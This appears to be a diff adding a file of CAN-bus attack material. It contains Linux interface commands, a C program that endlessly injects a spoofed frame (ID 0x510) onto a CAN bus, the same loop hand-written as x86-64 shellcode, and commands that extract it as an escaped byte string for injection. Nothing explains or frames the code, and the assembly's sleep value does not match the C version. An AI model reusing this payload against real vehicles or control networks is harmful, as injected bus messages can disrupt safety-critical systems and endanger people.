@@ -1,0 +1,102 @@
+sudo ip link set can0 type can bitrate 500000
+sudo ip link set up can0
+ip link set can0 type can help
+sudo ip link set canX type can restart-ms 100
+sudo ip link set canX type can restart
+#Custom the CAN tool
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <linux/can.h>
+#include <string.h>
+int main(int argc, char *argv[]) {
+	int s;
+	struct sockaddr_can addr;
+	struct ifreq ifr;
+	struct can_frame frame;
+	s = socket(PF_CAN, SOCK_RAW, CAN_RAW);
+	strcpy(ifr.ifr_name, "vcan0");
+	ioctl(s, SIOCGIFINDEX, &ifr);
+	addr.can_family = AF_CAN;
+	addr.can_ifindex = ifr.ifr_ifindex;
+	bind(s, (struct sockaddr *)&addr, sizeof(addr));
+	frame.can_id = 0x510;
+	frame.can_dlc = 8;
+	frame.data[1] = 0xFF;
+	while(1) {
+		write(s, &frame, sizeof(struct can_frame));
+		usleep(500000);
+	}
+}
+
+section .text
+global _start
+_start:
+						; s = socket(PF_CAN, SOCK_RAW, CAN_RAW);
+push 41 				; Socket syscall from unistd_64.h
+pop rax
+push 29 				; PF_CAN from socket.h
+pop rdi
+push 3  				; SOCK_RAW from socket_type.h
+pop rsi
+push 1  				; CAN_RAW from can.h
+pop rdx
+syscall
+mov r8, rax 			; s / File descriptor from socket
+						; strcpy(ifr.ifr_name, "vcan0" );
+sub rsp, 40 			; struct ifreq is 40 bytes
+xor r9, r9  			; temp register to hold interface name
+mov r9, 0x306e616376  	; vcan0
+push r9
+pop qword [rsp] 		; ioctl(s, SIOCGIFINDEX, &ifr);
+push 16         		; ioctrl from unistd_64.h
+pop rax
+mov rdi, r8     		; s / File descriptor
+push 0x8933     		; SIOCGIFINDEX from ioctls.h
+pop rsi
+mov rdx, rsp    		; &ifr
+syscall
+xor r9, r9      		; clear r9
+mov r9, [rsp+16]  		; ifr.ifr_ifindex
+						; addr.can_family = AF_CAN;
+sub rsp, 16       		; sizeof sockaddr_can
+mov word [rsp], 29     	; AF_CAN == PF_CAN
+						; addr.can_ifindex = ifr.ifr_ifindex;
+mov [rsp+4], r9        	; bind(s, (struct sockaddr *)&addr,sizeof(addr));
+push 49                	; bind from unistd_64.h
+pop rax
+mov rdi, r8 			; s /File descriptor
+mov rsi, rsp 			; &addr
+mov rdx, 16 			; sizeof(addr)
+syscall
+sub rsp, 16 			; sizeof can_frame
+mov word [rsp], 0x510 	; frame.can_id = 0x510;
+mov byte [rsp+4], 8 	; frame.can_dlc = 8;
+mov byte [rsp+9], 0xFF 	; frame.data[1] = 0xFF;
+						; while(1)
+loop:
+						; write(s, &frame, sizeof(struct can_frame));
+push 1 					; write from unistd_64.h
+pop rax
+mov rdi, r8 			; s/File descriptor
+mov rsi, rsp 			; &frame
+mov rdx, 16 			; sizeof can_frame
+syscall
+						; usleep(500000);
+push 35 				; nanosleep from unistd_64.h
+pop rax
+sub rsp, 16
+xor rsi, rsi
+mov [rsp], rsi 			; tv_sec
+mov dword [rsp+8], 500000 	; tv_nsec
+mov rdi, rsp
+syscall
+add rsp, 16
+jmp loop
+
+#nasm -f elf64 -o shell.o shell.S
+#ld -o shell shell.o
+#for i in $(objdump -d shell.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
